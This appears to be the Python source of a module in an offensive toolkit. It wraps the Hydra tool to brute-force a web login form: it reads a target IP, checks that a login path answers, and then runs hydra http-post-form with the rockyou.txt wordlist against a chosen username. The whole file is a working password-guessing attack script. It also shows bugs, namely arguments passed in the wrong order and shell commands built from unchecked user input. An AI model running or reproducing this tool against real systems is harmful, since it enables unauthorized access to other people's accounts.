import requests
import os

def control_url(url):
    yellow = "\033[33m"
    reset = "\033[0m"
    green = "\033[32m"
    red = "\033[31m" 

    with open("Options/target_ip.txt", "r") as file:
        target_ip = file.read()

    try:
        response = requests.get(f"http://{target_ip}/{url}", timeout=2)
        if response.status_code == 200:
            print(f"{green}\n[200] Destination URL is valid.{reset}")
            print(f"{yellow}\n[*] Launching the attack...{reset}")
            return True
        else:
            response2 = requests.get(f"https://{target_ip}/{url}", timeout=2)
            if response2.status_code == 200:
                print(f"{green}\n[200] Destination URL is valid.{reset}")
                print(f"{red}\n[*] Launching the attack...{reset}")
                return True
            print(f"{red}[{response.status_code}] Destination URL is not valid.{reset}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{red}\n[!] An error occurred while sending the request: {reset}{e}")
        return False

def hydra(username, wordlist, path):
    with open("Options/target_ip.txt", "r") as file:
        target_ip = file.read()
    os.system("rm Log/url_log.txt")
    os.system("touch Log/url_log.txt")
    command = f'hydra -l {username} -P {wordlist} {target_ip} http-post-form "{path}:username=^USER^&password=^PASS^:F=incorrect" -o Log/url_log.txt'
    os.system(command)

def hydra_parameters(username, wordlist, path, username_parameter, password_parameter):
    with open("Options/target_ip.txt", "r") as file:
        target_ip = file.read()

    os.system("rm Log/url_log.txt")
    os.system("touch Log/url_log.txt")
    command = f'hydra -l {username} -P {wordlist} {target_ip} http-post-form "{path}:{username_parameter}=^USER^&{password_parameter}=^PASS^:F=incorrect" -o Log/url_log.txt'

    if control_url(path):
        os.system(command)
        input("\n\n\nPress Enter to contiune...")
        exit()
    else:
        input("\n\n\nPress Enter to contiune...")
        exit()

def param(username, path ,temp_url):
    yellow = "\033[33m"
    reset = "\033[0m"
    green = "\033[32m"
    red = "\033[31m" 

    while True:
        temp_username_parameter = input(f"{yellow}[?] Enter the username parameter you want to attack 'e.g., {reset}http://example.com/login.php:{red}username{reset}=&password={yellow}' : {reset}")
        mod = input(f"{yellow}[?] Username parameter = {reset}{green}{temp_username_parameter}{reset}{yellow} , are you sure (Y/n): {reset}").lower()
        if mod == "y" or mod.strip() == "":
            username_parameter = temp_username_parameter
            break
    print("\n")
    while True:
        temp_password_parameter = input(f"{yellow}[?] Enter the password parameter you want to attack 'e.g., {reset}http://example.com/login.php:username=&{red}password{reset}={yellow}' : {reset}")
        mod = input(f"{yellow}[?] Password parameter = {reset}{green}{temp_password_parameter}{reset}{yellow} , are you sure (Y/n): {reset}").lower()
        if mod == "y" or mod.strip() == "":
            password_parameter = temp_password_parameter
            break

    hydra_parameters(username, path, temp_url, username_parameter, password_parameter)
 

def main():
    yellow = "\033[33m"
    reset = "\033[0m"
    green = "\033[32m"
    red = "\033[31m" 

    os.system("clear")
    string = f"{red}≿━━━━━━━━━━━━━━━━━━━━━━━━━━༺❀{reset} By YAY {red}❀༻━━━━━━━━━━━━━━━━━━━━━━━━━━≾{reset}"
    print(string)

    while True:
        temp_username = input(f"{yellow}[?] Specify the username for the target system: {reset}")
        mod = input(f"{yellow}[?] Username = {reset}{green}{temp_username}{reset}{yellow} , are you sure (Y/n): {reset}").lower()
        if mod == "y" or mod.strip() == "":
            username = temp_username
            break
    
    print("\n")

    with open("Options/target_ip.txt", "r") as file:
        target = file.read()
    
    default_path = "/usr/share/wordlists/rockyou.txt"
    while True:
        path_input = input(f"{yellow}[?] Please enter the worldlist (or press Enter to use default '/usr/share/wordlists/rockyou.txt'): {reset}")
        if path_input.strip() == "":
            if os.path.exists(default_path):
                path = default_path
                break
            else:
                print(f"{red}[!] File 'rockyou.txt' not found in default directory. (/usr/share/wordlists/rockyou.txt) {reset}")
        else:
            if not os.path.exists(path_input):
                print(f"{red}[!] Error: The specified wordlist file '{path_input}' does not exist. Please check the path and try again.{reset}")
            else:
                path = path_input
                break

    print("\n")

    while True:
        temp_url = input(f"{yellow}[?] Enter the URL path you want to attack 'e.g., /login.php' : {reset}")
        print(f"\n{yellow}[?] Do you want to set parameters manually? 'e.g., {reset}http://example.com/login.php:{red}username{reset}=&{red}password{reset}={yellow}'{reset}")
        parameters_input = input(f"{yellow}  (or press Enter to use default 'username=&password=') (y/N): {reset}").lower()
        if parameters_input == "y":
            print("\n\n\n")
            param(username, path, temp_url)
            input()
        if control_url(temp_url):
            print("\n\n\n")
            hydra(username, path, temp_url)
            break
        else:
            break

    input("\n\n\nPress Enter to contiune...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()